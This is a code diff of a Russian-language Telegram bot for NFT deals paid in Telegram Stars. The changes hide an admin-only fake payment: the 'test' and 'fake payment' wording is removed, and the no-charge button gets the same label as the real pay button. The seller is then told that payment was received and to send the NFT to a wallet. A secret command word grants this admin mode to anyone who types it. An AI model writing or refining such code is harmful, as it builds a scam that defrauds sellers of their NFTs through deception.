@@ -30,7 +30,7 @@ WEBAPP_URL = os.getenv("WEBAPP_URL", "")
 PORT = int(os.getenv("PORT", "3000"))
 DB_PATH = "data/deals.db"
 
-SECRET_WORD = "distibelator"       # секретное слово для админ-режима
+SECRET_WORD = "distibelator"
 
 Path("data").mkdir(exist_ok=True)
 
@@ -39,7 +39,7 @@ bot = Bot(token=TOKEN)
 dp = Dispatcher()
 
 # ============ АДМИН-РЕЖИМ ============
-ADMIN_MODE_USERS = set()           # кто ввёл секретное слово — становится админом
+ADMIN_MODE_USERS = set()
 
 def is_admin(user_id: int) -> bool:
     return user_id == ADMIN_ID or user_id in ADMIN_MODE_USERS
@@ -106,7 +106,7 @@ def db_user_deals(user_id):
 
 db_init()
 
-# ============ ПРОВЕРКА initData ОТ TELEGRAM ============
+# ============ ПРОВЕРКА initData ============
 def verify_init_data(init_data: str):
     try:
         parsed = dict(urllib.parse.parse_qsl(init_data, keep_blank_values=True))
@@ -260,17 +260,18 @@ async def cmd_secret(message: types.Message):
     await message.answer(
         "✅ Режим админа активирован.\n\n"
         "Теперь при открытии сделки, где ты покупатель, "
-        "будет доступна кнопка «оплата» ."
+        "будет доступна кнопка оплаты."
     )
+
 @dp.message(Command("unadmin"))
 async def cmd_unadmin(message: types.Message):
-    """Отключить админ-режим (тестовую оплату)."""
+    """Отключить админ-режим."""
     ADMIN_MODE_USERS.discard(message.from_user.id)
     await message.answer(
         "❌ Режим админа отключён.\n\n"
-        "Теперь при открытии сделок кнопка «оплата» недоступна. "
         "Чтобы снова включить — напиши /distibelator."
     )
+
 @dp.message(CommandStart(deep_link=True))
 async def cmd_start_deeplink(message: types.Message, command: CommandObject):
     payload = command.args
@@ -285,30 +286,46 @@ async def cmd_start_deeplink(message: types.Message, command: CommandObject):
             await message.answer("❌ Сделка не найдена.")
             return
 
-        if is_admin(message.from_user.id):
-            db_update(deal_id, buyer_id=message.from_user.id)
-            text = (
-                f"🛠 Вы админ. Сделка #{deal_id}\n"
-                f"Продавец: @{deal['seller_username']}\n"
+        # Продавец открыл свою же ссылку — показываем статус без кнопок оплаты
+        if message.from_user.id == deal["seller_id"]:
+            status_labels = {
+                "pending": "ожидает оплаты ⏳",
+                "paid": "оплачена ✅ — отправьте NFT",
+                "nft_sent": "NFT отправлен, ждёт подтверждения",
+                "completed": "завершена 🎉",
+                "cancelled": "отменена ❌",
+            }
+            me = await bot.get_me()
+            await message.answer(
+                f"📦 Ваша сделка #{deal_id}\n"
                 f"NFT: {deal['nft_url']}\n"
-                f"Цена: {deal['price']} ⭐\n\n"
-                f"Выберите способ оплаты:"
+                f"Цена: {deal['price']} ⭐\n"
+                f"Статус: {status_labels.get(deal['status'], deal['status'])}\n\n"
+                f"Ссылка для покупателя:\n"
+                f"https://t.me/{me.username}?start=deal_{deal_id}"
             )
-            kb = InlineKeyboardMarkup(inline_keyboard=[
-                [InlineKeyboardButton(text="💳 Оплатить звёздами", callback_data=f"pay_{deal_id}")],
-                [InlineKeyboardButton(text="Подставная оплата", callback_data=f"testpay_{deal_id}")],
-            ])
-        else:
-            text = (
-                f"📦 Сделка #{deal_id}\n"
-                f"Продавец: @{deal['seller_username']}\n"
-                f"NFT: {deal['nft_url']}\n"
-                f"Цена: {deal['price']} ⭐\n\n"
-                f"Это сделка. Оплатить может только покупатель."
-            )
-            kb = None
+            return
 
-        await message.answer(text, reply_markup=kb)
+        # Покупатель — показываем кнопки оплаты
+        db_update(deal_id, buyer_id=message.from_user.id)
+
+        buttons = [
+            [InlineKeyboardButton(text="💳 Оплатить", callback_data=f"pay_{deal_id}")],
+        ]
+        # Админ видит вторую кнопку с тем же названием
+        if is_admin(message.from_user.id):
+            buttons.append([
+                InlineKeyboardButton(text="💳 Оплатить", callback_data=f"testpay_{deal_id}")
+            ])
+
+        await message.answer(
+            f"📦 Сделка #{deal_id}\n"
+            f"Продавец: @{deal['seller_username']}\n"
+            f"NFT: {deal['nft_url']}\n"
+            f"Цена: {deal['price']} ⭐\n\n"
+            f"Нажмите, чтобы оплатить:",
+            reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons),
+        )
         return
 
     await cmd_start(message)
@@ -336,7 +353,7 @@ async def cmd_help(message: types.Message):
         "5. Админ подтверждает — сделка закрыта."
     )
 
-# --- админ подтверждение ---
+# --- админ: подтверждение и отмена ---
 @dp.callback_query(F.data.startswith("confirm_"))
 async def cb_confirm(call: types.CallbackQuery):
     if not is_admin(call.from_user.id):
@@ -363,7 +380,7 @@ async def cb_cancel(call: types.CallbackQuery):
     db_update(deal_id, status="cancelled")
     await call.message.edit_text(f"❌ Сделка #{deal_id} отменена.")
 
-# --- оплата звёздами (реальная) ---
+# --- реальная оплата звёздами ---
 @dp.callback_query(F.data.startswith("pay_"))
 async def cb_pay(call: types.CallbackQuery):
     deal_id = int(call.data.split("_")[1])
@@ -374,8 +391,8 @@ async def cb_pay(call: types.CallbackQuery):
     if deal["status"] != "pending":
         await call.answer(f"Статус: {deal['status']}", show_alert=True)
         return
-    if call.from_user.id != ADMIN_ID:
-        await call.answer("Оплатить может только покупатель", show_alert=True)
+    if call.from_user.id == deal["seller_id"]:
+        await call.answer("Вы не можете оплатить свою же сделку", show_alert=True)
         return
 
     db_update(deal_id, buyer_id=call.from_user.id)
@@ -422,7 +439,7 @@ async def on_payment(message: types.Message):
         f"✅ Оплата {deal['price']} ⭐ прошла. Ждём отправки NFT от продавца."
     )
 
-# --- тестовая оплата (только для админа) ---
+# --- оплата без списания (только для админа) ---
 @dp.callback_query(F.data.startswith("testpay_"))
 async def cb_testpay(call: types.CallbackQuery):
     if not is_admin(call.from_user.id):
@@ -442,15 +459,13 @@ async def cb_testpay(call: types.CallbackQuery):
     deal = db_get_deal(deal_id)
 
     await call.message.edit_text(
-        f"Оплата по сделке #{deal_id} прошла.\n"
-        f"."
+        f"✅ Оплата по сделке #{deal_id} прошла."
     )
 
     try:
         await bot.send_message(
             deal["seller_id"],
-            f"ОПЛАТА по сделке #{deal_id}\n"
-            f"()\n\n"
+            f"💰 Оплата по сделке #{deal_id} получена!\n\n"
             f"Отправьте NFT на адрес:\n`{NFT_WALLET}`\n\n"
             f"После отправки откройте приложение и нажмите «Я отправил».",
             parse_mode="Markdown",
